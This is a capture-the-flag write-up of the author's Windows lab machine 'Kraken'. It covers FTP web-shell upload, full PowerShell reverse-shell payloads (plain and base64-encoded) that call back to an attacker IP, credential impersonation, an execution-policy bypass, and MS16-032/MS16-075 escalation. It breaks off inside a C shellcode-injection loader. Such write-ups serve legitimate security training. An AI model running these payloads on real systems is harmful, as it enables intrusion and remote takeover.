---
layout: post
title:  "Kraken - Writeup"
date:   2018-09-16 08:45:01 -0700
categories: news
---

# Introduction

Hello all, I am going to try to write a detailed write-up about a machine that was a challenge in Fatec Ourinhos CTF 2018 2nd edition.

The machine original name is Kraken and it was made by me to be part of a personal penetration testing lab for my team WATCHERS during 2017.


# Challenge information
Name: __Unleash the Kraken__

Our target IP address is __192.168.56.100__, and it's domain name is __kraken.wtc__.

Operational System: __Windows__

---


# Enumeration Phase

Nmap grants us the following output:
```bash
[root:~] nmap 192.168.56.100 -Pn -sT
Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-16 14:22 PDT
Nmap scan report for 192.168.56.100
Host is up, received user-set (0.10s latency).
Not shown: 990 filtered ports
Reason: 990 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       REASON
21/tcp    open  ftp           syn-ack
80/tcp    open  http          syn-ack
135/tcp   open  msrpc         syn-ack
443/tcp   open  https         syn-ack
1723/tcp  open  pptp          syn-ack
3389/tcp  open  ms-wbt-server syn-ack
49153/tcp open  unknown       syn-ack
49154/tcp open  unknown       syn-ack
49156/tcp open  unknown       syn-ack
49157/tcp open  unknown       syn-ack

Nmap done: 1 IP address (1 host up) scanned in 10.73 seconds
```

It is clear that we have a website and a FTP server to test upon. The other services require credentials, which we still do not have.

The web page is kraken theme.
![Screenshot](/assets/kraken-pic-02.JPG)

Let's fire up a cURL over http port and see what we get:

```bash
[root:~] curl http://192.168.56.100 
<html>
<body>
	<div align="center">
	<h1>Release the kraken!</h1>
	<img src="kraken-pic.jpg"/>
	</div>
	<!-- Username: DavyJones -->
	<!-- Password: #kr4kud0o0O -->
</body>
</html>    
```

We already got a credential, okay. Tried FTP (port 21) and got nothing, tried RDP (port 3389) and got nothing too!

# Vulnerability Analysis

Now I tested for anonymous FTP access and went successful!

```bash
[root:~] ftp 192.168.56.100
Connected to 192.168.56.100.
220 Microsoft FTP Service
Name (192.168.56.100:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230-Directory has 49,359,065,088 bytes of disk space available.
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
05-17-2018  01:08PM       <DIR>          kraken
05-17-2018  02:01PM       <DIR>          uploads
05-17-2018  01:08PM       <DIR>          App_Data
05-17-2018  11:26AM                  189 index.html
05-17-2018  11:21AM                53404 kraken-pic.jpg
226-Directory has 49,359,065,088 bytes of disk space available.
226 Transfer complete.
ftp> 
```

We can access the web root from FTP anonymous access, let's try to upload a file.

```bash
[root:/tmp] echo 'andre' >> file.txt
[root:/tmp] ftp 192.168.56.100
Connected to 192.168.56.100.
220 Microsoft FTP Service
Name (192.168.56.100:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230-Directory has 49,354,731,520 bytes of disk space available.
230 User logged in.
Remote system type is Windows_NT.
ftp> put file.txt
local: file.txt remote: file.txt
200 PORT command successful.
550 Access is denied. 
ftp> 
```

We can't. But maybe another folder? Upload folder is meant to receive files!

```bash
ftp> cd uploads
250 CWD command successful.
ftp> put file.txt
local: file.txt remote: file.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
7 bytes sent in 0.00 secs (175.2805 kB/s)
ftp> exit
221 Goodbye.
[root:/tmp] curl http://192.168.56.100/uploads/file.txt
andre
[root:/tmp] 
```

# Exploitation

Now we know a way of uploading arbitrary files and that we can access it using the web browser. It is just a matter of uploading a web shell so we can get a shell over Kraken.

```bash
[root:/tmp] cp /usr/share/webshells/aspx/cmdasp.aspx .
[root:/tmp] ftp 192.168.56.100
Connected to 192.168.56.100.
220 Microsoft FTP Service
Name (192.168.56.100:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230-Directory has 49,345,097,728 bytes of disk space available.
230 User logged in.
Remote system type is Windows_NT.
ftp> cd uploads
250 CWD command successful.
ftp> put cmdasp.aspx
local: cmdasp.aspx remote: cmdasp.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1442 bytes sent in 0.00 secs (42.9749 MB/s)
```

Now access it using the web browser and send commands!

![Screenshot](/assets/kraken-pic-01.JPG)

# Initial Foothold

To get a shell I have used my reverse shell generator tool to aid me, [shellpop](https://github.com/0x00-0x00/Shellpop), look below:
```bash
[root:/tmp] shellpop --payload windows/reverse/tcp/powershell -H tun0 -P 443 
[+] Execute this code in remote target: 

powershell.exe -nop -ep bypass -Command "$cFYlLK='10.11.12.26';$BfKleTWqoeSd=443;$czOaNBi=New-Object System.Net.Sockets.TCPClient($cFYlLK,$BfKleTWqoeSd);$QHFXyM=$czOaNBi.GetStream();[byte[]]$xdjeYJjrFCJTTT=0..65535|%{0};$tBoRkCjv=([text.encoding]::ASCII).GetBytes('PS '+(Get-Location).Path+'> ');$QHFXyM.Write($tBoRkCjv,0,$tBoRkCjv.Length);while(($LOlZmTcyLFlYNih=$QHFXyM.Read($xdjeYJjrFCJTTT,0,$xdjeYJjrFCJTTT.Length)) -ne 0){$qLUSJN=([text.encoding]::ASCII).GetString($xdjeYJjrFCJTTT,0,$LOlZmTcyLFlYNih);try{$yWMBwfso=(Invoke-Expression -c $qLUSJN 2>&1|Out-String)}catch{Write-Warning 'Something went wrong with execution of command on the target.';Write-Error $_;};$cFYlLK0=$yWMBwfso+'PS '+(Get-Location).Path+'> ';$cFYlLK1=($cFYlLK2[0]|Out-String);$cFYlLK2.clear();$cFYlLK0=$cFYlLK0+$cFYlLK1;$tBoRkCjv=([text.encoding]::ASCII).GetBytes($cFYlLK0);$QHFXyM.Write($tBoRkCjv,0,$tBoRkCjv.Length);$QHFXyM.Flush();};$czOaNBi.Close();if($cFYlLK3){$cFYlLK3.Stop();};" 

[+] This shell DOES NOT have a handler set.
[root:/tmp]# nc -lvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 192.168.56.100.
Ncat: Connection from 192.168.56.100:49244.
PS C:\windows\system32\inetsrv> 
```

Now we have a foothold into the system. There is many ways of achieving SYSTEM privileges in this machine but this is for Privilege Escalation phase.

# Privilege Escalation

If you spend a little time on enumeration phase, we soon will understand that this machine is missing a lot of hotfixes.

```bash
PS C:\windows\system32\inetsrv> Get-Hotfix | Where-Object { $_.Description -eq "Security Update" } 

Source        Description      HotFixID      InstalledBy          InstalledOn  
------        -----------      --------      -----------          -----------  
KRAKEN        Security Update  KB2479943                          6/15/2015 ...
KRAKEN        Security Update  KB2491683                          6/15/2015 ...
KRAKEN        Security Update  KB2506212                          6/15/2015 ...
KRAKEN        Security Update  KB2509553                          6/15/2015 ...
KRAKEN        Security Update  KB2511455                          6/15/2015 ...
KRAKEN        Security Update  KB2525835                          6/15/2015 ...
KRAKEN        Security Update  KB2536275                          6/15/2015 ...
KRAKEN        Security Update  KB2536276                          6/15/2015 ...
KRAKEN        Security Update  KB2544893                          6/15/2015 ...
KRAKEN        Security Update  KB2560656                          6/15/2015 ...
KRAKEN        Security Update  KB2564958                          6/15/2015 ...
KRAKEN        Security Update  KB2570947                          6/15/2015 ...
KRAKEN        Security Update  KB2585542                          6/15/2015 ...
KRAKEN        Security Update  KB2604115                          6/15/2015 ...
KRAKEN        Security Update  KB2620704                          6/15/2015 ...
KRAKEN        Security Update  KB2621440                          6/15/2015 ...
KRAKEN        Security Update  KB2631813                          6/15/2015 ...
KRAKEN        Security Update  KB2643719                          6/15/2015 ...
KRAKEN        Security Update  KB2654428                          6/15/2015 ...
KRAKEN        Security Update  KB2667402                          6/15/2015 ...
KRAKEN        Security Update  KB2676562                          6/15/2015 ...
KRAKEN        Security Update  KB2690533                          6/15/2015 ...
KRAKEN        Security Update  KB2698365                          6/15/2015 ...
KRAKEN        Security Update  KB2705219                          6/15/2015 ...
KRAKEN        Security Update  KB2712808                          6/15/2015 ...
KRAKEN        Security Update  KB2727528                          6/15/2015 ...
KRAKEN        Security Update  KB2736422                          6/15/2015 ...
KRAKEN        Security Update  KB2742599                          6/15/2015 ...
KRAKEN        Security Update  KB2765809     KRAKEN\Administrator 6/15/2015 ...
KRAKEN        Security Update  KB2770660                          6/15/2015 ...
KRAKEN        Security Update  KB2807986                          6/15/2015 ...
KRAKEN        Security Update  KB2813347                          6/15/2015 ...
KRAKEN        Security Update  KB2813430                          6/15/2015 ...
KRAKEN        Security Update  KB2832414                          6/15/2015 ...
KRAKEN        Security Update  KB2835361                          6/15/2015 ...
KRAKEN        Security Update  KB2839894                          6/15/2015 ...
KRAKEN        Security Update  KB2840631                          6/15/2015 ...
KRAKEN        Security Update  KB2847927                          6/15/2015 ...
KRAKEN        Security Update  KB2861191                          6/15/2015 ...
KRAKEN        Security Update  KB2861698                          6/15/2015 ...
KRAKEN        Security Update  KB2862152                          6/15/2015 ...
KRAKEN        Security Update  KB2862330                          6/15/2015 ...
KRAKEN        Security Update  KB2862335                          6/15/2015 ...
KRAKEN        Security Update  KB2862973                          6/15/2015 ...
KRAKEN        Security Update  KB2864058                          6/15/2015 ...
KRAKEN        Security Update  KB2864202                          6/15/2015 ...
KRAKEN        Security Update  KB2868038                          6/15/2015 ...
KRAKEN        Security Update  KB2871997                          6/15/2015 ...
KRAKEN        Security Update  KB2872339                          6/15/2015 ...
KRAKEN        Security Update  KB2884256                          6/15/2015 ...
KRAKEN        Security Update  KB2887069                          6/15/2015 ...
KRAKEN        Security Update  KB2892074                          6/15/2015 ...
KRAKEN        Security Update  KB2893294                          6/15/2015 ...
KRAKEN        Security Update  KB2894844                          6/15/2015 ...
KRAKEN        Security Update  KB2898851                          6/15/2015 ...
KRAKEN        Security Update  KB2900986                          6/15/2015 ...
KRAKEN        Security Update  KB2911501                          6/15/2015 ...
KRAKEN        Security Update  KB2912390                          6/15/2015 ...
KRAKEN        Security Update  KB2918614                          6/15/2015 ...
KRAKEN        Security Update  KB2922229                          6/15/2015 ...
KRAKEN        Security Update  KB2923392                          6/15/2015 ...
KRAKEN        Security Update  KB2931356                          6/15/2015 ...
KRAKEN        Security Update  KB2937610                          6/15/2015 ...
KRAKEN        Security Update  KB2939576                          6/15/2015 ...
KRAKEN        Security Update  KB2943357                          6/15/2015 ...
KRAKEN        Security Update  KB2957189                          6/15/2015 ...
KRAKEN        Security Update  KB2957503                          6/15/2015 ...
KRAKEN        Security Update  KB2957509                          6/15/2015 ...
KRAKEN        Security Update  KB2961072                          6/15/2015 ...
KRAKEN        Security Update  KB2968294                          6/15/2015 ...
KRAKEN        Security Update  KB2971850                          6/15/2015 ...
KRAKEN        Security Update  KB2972100                          6/15/2015 ...
KRAKEN        Security Update  KB2972211                          6/15/2015 ...
KRAKEN        Security Update  KB2972280                          6/15/2015 ...
KRAKEN        Security Update  KB2973112                          6/15/2015 ...
KRAKEN        Security Update  KB2973201                          6/15/2015 ...
KRAKEN        Security Update  KB2973351                          6/15/2015 ...
KRAKEN        Security Update  KB2976627                          6/15/2015 ...
KRAKEN        Security Update  KB2976897                          6/15/2015 ...
KRAKEN        Security Update  KB2977292                          6/15/2015 ...
KRAKEN        Security Update  KB2978120                          6/15/2015 ...
KRAKEN        Security Update  KB2978668                          6/15/2015 ...
KRAKEN        Security Update  KB2979570                          6/15/2015 ...
KRAKEN        Security Update  KB2984972                          6/15/2015 ...
KRAKEN        Security Update  KB2991963                          6/15/2015 ...
KRAKEN        Security Update  KB2992611                          6/15/2015 ...
KRAKEN        Security Update  KB2993958                          6/15/2015 ...
KRAKEN        Security Update  KB3002657     KRAKEN\Administrator 6/15/2015 ...
KRAKEN        Security Update  KB3003743                          6/15/2015 ...
KRAKEN        Security Update  KB3004361                          6/15/2015 ...
KRAKEN        Security Update  KB3004375                          6/15/2015 ...
KRAKEN        Security Update  KB3008923                          6/15/2015 ...
KRAKEN        Security Update  KB3010788                          6/15/2015 ...
KRAKEN        Security Update  KB3011780                          6/15/2015 ...
KRAKEN        Security Update  KB3014029     KRAKEN\Administrator 6/15/2015 ...
KRAKEN        Security Update  KB3019215                          6/15/2015 ...
KRAKEN        Security Update  KB3020388                          6/15/2015 ...
KRAKEN        Security Update  KB3021674                          6/15/2015 ...
KRAKEN        Security Update  KB3021952                          6/15/2015 ...
KRAKEN        Security Update  KB3022777                          6/15/2015 ...
KRAKEN        Security Update  KB3023215                          6/15/2015 ...
KRAKEN        Security Update  KB3030377                          6/15/2015 ...
KRAKEN        Security Update  KB3032323                          6/15/2015 ...
KRAKEN        Security Update  KB3032359                          6/15/2015 ...
KRAKEN        Security Update  KB3032655                          6/15/2015 ...
KRAKEN        Security Update  KB3033889                          6/15/2015 ...
KRAKEN        Security Update  KB3033929                          6/15/2015 ...
KRAKEN        Security Update  KB3034344                          6/15/2015 ...
KRAKEN        Security Update  KB3035126                          6/15/2015 ...
KRAKEN        Security Update  KB3035132                          6/15/2015 ...
KRAKEN        Security Update  KB3037574                          6/15/2015 ...
KRAKEN        Security Update  KB3039066                          6/15/2015 ...
KRAKEN        Security Update  KB3042553                          6/15/2015 ...
KRAKEN        Security Update  KB3045171                          6/15/2015 ...
KRAKEN        Security Update  KB3045685                          6/15/2015 ...
KRAKEN        Security Update  KB3045999                          6/15/2015 ...
KRAKEN        Security Update  KB3046002                          6/15/2015 ...
KRAKEN        Security Update  KB3046049                          6/15/2015 ...
KRAKEN        Security Update  KB3046269                          6/15/2015 ...
KRAKEN        Security Update  KB3046306                          6/15/2015 ...
KRAKEN        Security Update  KB3046482                          6/15/2015 ...
KRAKEN        Security Update  KB3048070                          6/15/2015 ...
KRAKEN        Security Update  KB3049563                          6/15/2015 ...
KRAKEN        Security Update  KB3051768                          6/15/2015 ...
KRAKEN        Security Update  KB3055642                          6/15/2015 ...
KRAKEN        Security Update  KB3057839                          6/15/2015 ...
KRAKEN        Security Update  KB3058515                          6/15/2015 ...
KRAKEN        Security Update  KB3059317                          6/15/2015 ...
KRAKEN        Security Update  KB3061518                          6/15/2015 ...
KRAKEN        Security Update  KB3063858                          6/15/2015 ...

PS C:\windows\system32\inetsrv> 
```

It's last Hotfix was KB 3063858! Such and old hotfix. There is more than one vulnerability that can be used to privilege escalate to SYSTEM. Such as:

__MS16-032__

__MS16-075__

All of them can be used and are proven to be succesful. I will detail on how to exploit each one of them below.

## MS16-032

This vulnerability is a race condition for multi-core (important detail) Windows machines that allows and user to be able to get SYSTEM privileges.

You can grab a copy of this exploit in it's powershell version here: [Exploit Link](https://www.exploit-db.com/exploits/39719/)

There is one more detail, to use it, we can't be in Session 0. What is session 0? You can have more information about that in this [Link](https://kb.firedaemon.com/support/solutions/articles/4000086228-what-is-session-0-isolation-what-do-i-need-to-know-about-it-)

So, after knowing what Session 0 is, you will understand that we need an interactive session in Windows to exploit this vulnerability.

We can achieve interactive session with Remote Desktop, which is allowed, but we can't login with the credentials we found in web-page with it.

![Screenshot](/assets/kraken-pic-03.JPG)

Let's enumerate machine users, then.

![Screenshot](/assets/kraken-pic-04.JPG)

So there are two users, DavyJones (which we know the password) and JackSparrow (which we do not). Let's check their group membership now.

![Screenshot](/assets/kraken-pic-05.JPG)

DavyJones is a simple user. That's not so cool. What about JackSparrow?

![Screenshot](/assets/kraken-pic-06.JPG)

Now we know that JackSparrow has Remote Desktop capabilities, if it's possible to get access over his account, we are able to escalate to SYSTEM using MS16-032, let's try using our DavyJones credentials and browse his files using PowerShell.

Using the following PowerShell command, we are able to execute commands as DavyJones using our web shell:

```cmd
powershell -nop -ep bypass -command $u='KRAKEN\DavyJones';$p='#kr4kud0o0O';$c=convertTo-SecureString -AsPlainText -Force $p;$c=new-object system.management.automation.pscredential($u,$c);Invoke-Command -ComputerName 127.0.0.1 -Credential $c -ScriptBlock { whoami  }
```

![Screenshot](/assets/kraken-pic-07.JPG)

Now we can try to get a reverse shell for DavyJones user, it's always easier with [Shellpop](https://github.com/0x00-0x00/Shellpop) so let's use it.

To generate a clean reverse tcp powershell command with my tool, this is the syntax:
```bash
[root:/tmp] shellpop --payload windows/reverse/tcp/powershell -H tun0 -P 443 --base64
[+] Execute this code in remote target: 

powershell.exe -nop -ep bypass -Encoded JABLAFUAVwB1AEsASgB1AD0AJwAxADAALgAxADEALgAxADIALgAxADQAJwA7ACQATgBuAGkASgBjAHUAWABqAE8AegBMAG0APQA0ADQAMwA7ACQASQBDAGEAQQB3AEYATwBkAEQAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACQASwBVAFcAdQBLAEoAdQAsACQATgBuAGkASgBjAHUAWABqAE8AegBMAG0AKQA7ACQARwBFAGsAWgBrAFYAVABYAFQAUwB5AEgAPQAkAEkAQwBhAEEAdwBGAE8AZABEAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYQBPAFUATgBRAFoAWgByAFkAcABEAD0AMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7ACQAdgBPAGQAZQBoAGYATwBVAHYAcgBaAEoAPQAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACcAUABTACAAJwArACgARwBlAHQALQBMAG8AYwBhAHQAaQBvAG4AKQAuAFAAYQB0AGgAKwAnAD4AIAAnACkAOwAkAEcARQBrAFoAawBWAFQAWABUAFMAeQBIAC4AVwByAGkAdABlACgAJAB2AE8AZABlAGgAZgBPAFUAdgByAFoASgAsADAALAAkAHYATwBkAGUAaABmAE8AVQB2AHIAWgBKAC4ATABlAG4AZwB0AGgAKQA7AHcAaABpAGwAZQAoACgAJABiAGcATgBSAG8AVwA9ACQARwBFAGsAWgBrAFYAVABYAFQAUwB5AEgALgBSAGUAYQBkACgAJABhAE8AVQBOAFEAWgBaAHIAWQBwAEQALAAwACwAJABhAE8AVQBOAFEAWgBaAHIAWQBwAEQALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ACQAeABxAEQAcwBLAHYAagB0AHAAZwBpAFAARAA9ACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGEATwBVAE4AUQBaAFoAcgBZAHAARAAsADAALAAkAGIAZwBOAFIAbwBXACkAOwB0AHIAeQB7ACQARABZAE8ATgByAEYARgBPAD0AKABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAtAGMAIAAkAHgAcQBEAHMASwB2AGoAdABwAGcAaQBQAEQAIAAyAD4AJgAxAHwATwB1AHQALQBTAHQAcgBpAG4AZwApAH0AYwBhAHQAYwBoAHsAVwByAGkAdABlAC0AVwBhAHIAbgBpAG4AZwAgACcAUwBvAG0AZQB0AGgAaQBuAGcAIAB3AGUAbgB0ACAAdwByAG8AbgBnACAAdwBpAHQAaAAgAGUAeABlAGMAdQB0AGkAbwBuACAAbwBmACAAYwBvAG0AbQBhAG4AZAAgAG8AbgAgAHQAaABlACAAdABhAHIAZwBlAHQALgAnADsAVwByAGkAdABlAC0ARQByAHIAbwByACAAJABfADsAfQA7ACQASwBVAFcAdQBLAEoAdQAwAD0AJABEAFkATwBOAHIARgBGAE8AKwAnAFAAUwAgACcAKwAoAEcAZQB0AC0ATABvAGMAYQB0AGkAbwBuACkALgBQAGEAdABoACsAJwA+ACAAJwA7ACQASwBVAFcAdQBLAEoAdQAxAD0AKAAkAEsAVQBXAHUASwBKAHUAMgBbADAAXQB8AE8AdQB0AC0AUwB0AHIAaQBuAGcAKQA7ACQASwBVAFcAdQBLAEoAdQAyAC4AYwBsAGUAYQByACgAKQA7ACQASwBVAFcAdQBLAEoAdQAwAD0AJABLAFUAVwB1AEsASgB1ADAAKwAkAEsAVQBXAHUASwBKAHUAMQA7ACQAdgBPAGQAZQBoAGYATwBVAHYAcgBaAEoAPQAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQASwBVAFcAdQBLAEoAdQAwACkAOwAkAEcARQBrAFoAawBWAFQAWABUAFMAeQBIAC4AVwByAGkAdABlACgAJAB2AE8AZABlAGgAZgBPAFUAdgByAFoASgAsADAALAAkAHYATwBkAGUAaABmAE8AVQB2AHIAWgBKAC4ATABlAG4AZwB0AGgAKQA7ACQARwBFAGsAWgBrAFYAVABYAFQAUwB5AEgALgBGAGwAdQBzAGgAKAApADsAfQA7ACQASQBDAGEAQQB3AEYATwBkAEQALgBDAGwAbwBzAGUAKAApADsAaQBmACgAJABLAFUAVwB1AEsASgB1ADMAKQB7ACQASwBVAFcAdQBLAEoAdQAzAC4AUwB0AG8AcAAoACkAOwB9ADsAIAA=

[+] This shell DOES NOT have a handler set.
```


Our final command for webshell becomes:
```cmd
powershell -nop -ep bypass -command $u='KRAKEN\DavyJones';$p='#kr4kud0o0O';$c=convertTo-SecureString -AsPlainText -Force $p;$c=new-object system.management.automation.pscredential($u,$c);Invoke-Command -ComputerName 127.0.0.1 -Credential $c -ScriptBlock { powershell.exe -nop -ep bypass -Encoded JABLAFUAVwB1AEsASgB1AD0AJwAxADAALgAxADEALgAxADIALgAxADQAJwA7ACQATgBuAGkASgBjAHUAWABqAE8AegBMAG0APQA0ADQAMwA7ACQASQBDAGEAQQB3AEYATwBkAEQAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACQASwBVAFcAdQBLAEoAdQAsACQATgBuAGkASgBjAHUAWABqAE8AegBMAG0AKQA7ACQARwBFAGsAWgBrAFYAVABYAFQAUwB5AEgAPQAkAEkAQwBhAEEAdwBGAE8AZABEAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYQBPAFUATgBRAFoAWgByAFkAcABEAD0AMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7ACQAdgBPAGQAZQBoAGYATwBVAHYAcgBaAEoAPQAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACcAUABTACAAJwArACgARwBlAHQALQBMAG8AYwBhAHQAaQBvAG4AKQAuAFAAYQB0AGgAKwAnAD4AIAAnACkAOwAkAEcARQBrAFoAawBWAFQAWABUAFMAeQBIAC4AVwByAGkAdABlACgAJAB2AE8AZABlAGgAZgBPAFUAdgByAFoASgAsADAALAAkAHYATwBkAGUAaABmAE8AVQB2AHIAWgBKAC4ATABlAG4AZwB0AGgAKQA7AHcAaABpAGwAZQAoACgAJABiAGcATgBSAG8AVwA9ACQARwBFAGsAWgBrAFYAVABYAFQAUwB5AEgALgBSAGUAYQBkACgAJABhAE8AVQBOAFEAWgBaAHIAWQBwAEQALAAwACwAJABhAE8AVQBOAFEAWgBaAHIAWQBwAEQALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ACQAeABxAEQAcwBLAHYAagB0AHAAZwBpAFAARAA9ACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGEATwBVAE4AUQBaAFoAcgBZAHAARAAsADAALAAkAGIAZwBOAFIAbwBXACkAOwB0AHIAeQB7ACQARABZAE8ATgByAEYARgBPAD0AKABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAtAGMAIAAkAHgAcQBEAHMASwB2AGoAdABwAGcAaQBQAEQAIAAyAD4AJgAxAHwATwB1AHQALQBTAHQAcgBpAG4AZwApAH0AYwBhAHQAYwBoAHsAVwByAGkAdABlAC0AVwBhAHIAbgBpAG4AZwAgACcAUwBvAG0AZQB0AGgAaQBuAGcAIAB3AGUAbgB0ACAAdwByAG8AbgBnACAAdwBpAHQAaAAgAGUAeABlAGMAdQB0AGkAbwBuACAAbwBmACAAYwBvAG0AbQBhAG4AZAAgAG8AbgAgAHQAaABlACAAdABhAHIAZwBlAHQALgAnADsAVwByAGkAdABlAC0ARQByAHIAbwByACAAJABfADsAfQA7ACQASwBVAFcAdQBLAEoAdQAwAD0AJABEAFkATwBOAHIARgBGAE8AKwAnAFAAUwAgACcAKwAoAEcAZQB0AC0ATABvAGMAYQB0AGkAbwBuACkALgBQAGEAdABoACsAJwA+ACAAJwA7ACQASwBVAFcAdQBLAEoAdQAxAD0AKAAkAEsAVQBXAHUASwBKAHUAMgBbADAAXQB8AE8AdQB0AC0AUwB0AHIAaQBuAGcAKQA7ACQASwBVAFcAdQBLAEoAdQAyAC4AYwBsAGUAYQByACgAKQA7ACQASwBVAFcAdQBLAEoAdQAwAD0AJABLAFUAVwB1AEsASgB1ADAAKwAkAEsAVQBXAHUASwBKAHUAMQA7ACQAdgBPAGQAZQBoAGYATwBVAHYAcgBaAEoAPQAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQASwBVAFcAdQBLAEoAdQAwACkAOwAkAEcARQBrAFoAawBWAFQAWABUAFMAeQBIAC4AVwByAGkAdABlACgAJAB2AE8AZABlAGgAZgBPAFUAdgByAFoASgAsADAALAAkAHYATwBkAGUAaABmAE8AVQB2AHIAWgBKAC4ATABlAG4AZwB0AGgAKQA7ACQARwBFAGsAWgBrAFYAVABYAFQAUwB5AEgALgBGAGwAdQBzAGgAKAApADsAfQA7ACQASQBDAGEAQQB3AEYATwBkAEQALgBDAGwAbwBzAGUAKAApADsAaQBmACgAJABLAFUAVwB1AEsASgB1ADMAKQB7ACQASwBVAFcAdQBLAEoAdQAzAC4AUwB0AG8AcAAoACkAOwB9ADsAIAA=  }
```

Then we get a reverse shell for DavyJones user!

![Screenshot](/assets/kraken-pic-08.JPG)

And we are quickly able to get Jack Sparrow password from a text file right from davy jones documents folder.

![Screenshot](/assets/kraken-pic-09.JPG)

Using the following command it is possible to access RDP and get interactive sessions!

```bash
[root:/tmp] rdesktop -u 'JackSparrow' -p 'sp4rr0w_rul3z' 192.168.56.100
```

After logging in using RDP, the next step is download the exploit script but soon we will find that execution of scripts is disabled, see the picture below.

![Screenshot](/assets/kraken-pic-10.JPG)

To bypass this restriction, we can use the following PowerShell command:

```powershell
Set-ExecutionPolicy -Scope CurrentUser Bypass
```

After this feature is disabled, we are able to run the script and escalate our privileges to SYSTEM and root this machine!

![Screenshot](/assets/kraken-pic-11.JPG)

## MS16-075
This vulnerability lies when a Windows Service Account which have amongst it's privileges the SeImpersonatePrvilege, allowing to trigger a bug in Windows NT kernel that will leak a SYSTEM token, and as our user have SeImpersonatePrivilege, we are able to sniff it and impersonate ourselves to SYSTEM, escalating privileges.

Windows IIS and SQL servers are service accounts that do have this kind of privilege, so if we have a IIS or SQL server shell and the server is missing MS16-075 Hotfix, we can exploit it.

## Exploiting MS16-075

To exploit it, I chose the famous Rotten Potato exploit. So we need a meterpreter session. To get that, I chose to use a custom C code to inject shellcode into a remote process.

```c
int main()
{
	SIZE_T szShellcode = 476;
	BYTE shellcode[] = { 
		0xbd,0x82,0xcd,0xe3,0x7c,0xdb,0xda,0xd9,0x74,0x24,0xf4,0x58,0x31,0xc9,0xb1,
0x71,0x83,0xe8,0xfc,0x31,0x68,0x0f,0x03,0x68,0x8d,0x2f,0x16,0x80,0xd9,0x2c,
0x3d,0x89,0x31,0xfe,0xbe,0x6a,0xc1,0xbe,0xef,0x2b,0x91,0x12,0x41,0xfa,0x59,
0xa2,0xb3,0x67,0x11,0x4f,0x61,0x08,0xe9,0xc4,0xd4,0xd0,0xa1,0x51,0x8a,0xc0,
0x79,0xed,0x59,0x51,0x31,0xfe,0x2a,0x1b,0x8b,0x4d,0x64,0x55,0x43,0x7f,0x46,
0xc9,0x6f,0x1e,0x3a,0x10,0xa3,0xc0,0x83,0xd5,0x72,0x0d,0x45,0xd7,0x45,0xec,
0xa8,0x85,0x04,0xa0,0x7a,0xa1,0xd4,0x62,0xf0,0xf7,0xe4,0x2a,0x07,0x28,0x72,
0x2a,0x7f,0xd0,0x71,0x2e,0x8f,0x65,0xf7,0x2e,0x8f,0x65,0x7c,0xae,0x07,0x65,
0x82,0xaf,0x5f,0xe3,0x42,0xdb,0x38,0xa3,0x43,0xf4,0x97,0xb8,0x0b,0xec,0x53,
0x34,0xcb,0x2c,0x15,0x4b,0x1b,0xcf,0xf3,0x03,0x64,0xd9,0xbd,0x18,0xae,0x52,
0x75,0x1e,0x18,0x2f,0xb7,0xe9,0xec,0x81,0x77,0x45,0xad,0x20,0xbe,0x9b,0x6c,
0xa2,0x80,0x9c,0x8e,0xd1,0xf3,0x91,0x4d,0x56,0xd0,0x21,0x14,0x5f,0xc9,0x47,
0x4e,0xc7,0xad,0x2c,0x2e,0xdc,0x64,0x32,0x7e,0x7a,0x36,0xbf,0x72,0xcb,0xfc,
0x34,0xca,0xd7,0xb5,0x4b,0x1a,0xa6,0xce,0x48,0x12,0x61,0xd0,0x80,0x63,0x2a,
0x93,0x78,0x3d,0x93,0x49,0x38,0x99,0x62,0x37,0xfb,0x43,0x2d,0x44,0x17,0x53,
0xec,0x18,0x17,0x73,0xb6,0xdd,0xbe,0x29,0x0f,0x55,0x52,0x24,0xc4,0x96,0xac,
